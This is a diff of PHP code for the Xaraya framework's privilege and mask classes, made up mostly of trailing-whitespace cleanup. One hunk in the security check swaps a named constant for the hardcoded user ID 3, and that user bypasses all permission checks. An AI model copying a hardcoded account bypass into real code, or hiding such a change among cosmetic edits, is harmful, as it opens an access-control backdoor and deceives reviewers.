@@ -22,7 +22,7 @@
  * @author  Marc Lutolf <marcinmilan@xaraya.com>
  * @access  public
  * @throws  none
- * @todo    evaluate scoping 
+ * @todo    evaluate scoping
 */
 
 
@@ -372,7 +372,7 @@ class xarMasks
     {
         $userID = xarSessionGetVar('uid');
         xarLogMessage("PRIVS: uid in security check: $userID");
-        if ($userID == XARUSER_LAST_RESORT) return true;
+        if ($userID == 3) return true;
 
         $maskname = $mask;
         $mask =  $this->getMask($mask);
@@ -1020,7 +1020,7 @@ class xarPrivileges extends xarMasks
             }
         }
         return $allprivileges;
-        
+
     }
 
 /**
@@ -1145,18 +1145,18 @@ class xarPrivileges extends xarMasks
  * @todo    this isn't really the right place for this function
  * @todo    ucfirst is a presentation issue.
  */
-    
+
     function getmodules()
     {
         static $allmodules = array();
 
         if (empty($allmodules)) {
             $query = "SELECT modules.xar_id, modules.xar_name
-                      FROM $this->modulestable modules 
+                      FROM $this->modulestable modules
                       WHERE modules.xar_state = ?
                       ORDER BY modules.xar_name";
             $result = $this->dbconn->Execute($query,array(3));
-            
+
             // add some extra lines we want
             // $allmodules[] = array('id' => -2, 'name' => ' ');
             $allmodules[] = array('id' => -1,
@@ -1426,7 +1426,7 @@ class xarPrivileges extends xarMasks
                            'level'=>$level,
                            'description'=>$description,
                            'parentid'=>0);
-            
+
             $priv = new xarPrivilege($pargs);
             xarVarSetCached($cacheKey,$pid,$priv);
             return $priv;
